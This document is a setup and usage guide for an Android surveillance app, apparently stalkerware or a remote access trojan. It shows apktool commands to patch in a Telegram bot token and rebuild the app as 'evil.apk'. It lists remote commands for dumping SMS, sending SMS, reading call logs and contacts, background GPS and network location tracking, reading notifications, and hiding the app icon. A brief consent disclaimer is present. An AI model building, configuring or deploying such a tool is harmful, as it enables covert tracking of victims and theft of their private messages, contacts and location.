# Configuration & Usage Guide

## 1. Telegram Bot Setup

### Create a Bot
1. Open Telegram and contact [@BotFather](https://t.me/BotFather).
2. Send `/newbot` and follow the instructions.
3. Save your Bot Token.

### Get Your Chat ID
1. Contact [@myidbot](https://t.me/myidbot) or [@userinfobot](https://t.me/userinfobot).
2. Start a conversation and copy your Chat ID.

> **Security:** Never publish real tokens or credentials on GitHub.

---

## 2. APK Modification

### Decompile
```bash
apktool d SystemMonitor.apk -o SystemMonitor_work
```

### Configure Telegram
```bash
nano SystemMonitor_work/assets/config.txt
```

Add your credentials:

```ini
BOT_TOKEN=PASTE_YOUR_TOKEN_HERE
CHAT_ID=PASTE_YOUR_CHAT_ID_HERE
```

### Rebuild
```bash
apktool b SystemMonitor_work -o evil.apk
```

---

# Features & Capabilities

## Device Information
- `/info` — Device information.
- `/online` — Device availability.
- `/battery` — Battery status.

## Location Services

### `/location_gps`
- Requests a fresh GPS location (up to 35 seconds).
- Falls back to the last-known GPS location.
- Does not fall back to network location.

### `/location_net`
- Requests a fresh network location (up to 35 seconds).
- Falls back to the last-known network location.
- Does not fall back to GPS.

### `/location_history`
- Reads saved location history.
- Prefers the latest GPS entry when available.
- Background tracking intervals: GPS every 3 minutes and network every 5 minutes.

> Actual tracking depends on Android permissions, background restrictions, and device settings.

## Other Commands

| Category | Commands |
|---|---|
| SMS | `/sms_dump`, `/sms_send` |
| Calls | `/call_log` |
| Contacts | `/contacts`, `/contacts_add`, `/contacts_del` |
| System | `/notifications`, `/open_url`, `/apps` |
| App Controls | `/hide`, `/show`, `/status` |

Command behavior depends on implementation and granted permissions.

---

## Security & Privacy

- Use only on devices you own or are authorized to administer.
- Obtain consent before accessing personal data.
- Protect bot tokens and private credentials.
- Review permissions and Android restrictions.

## Requirements

- Android device or emulator.
- Telegram bot.
- Apktool.
- Required permissions for implemented features.

## Final Build Command

```bash
apktool b SystemMonitor_work -o evil.apk
```

> **Note:** The APK may need to be signed before installation. Verify documented features and tracking intervals against the actual source code.
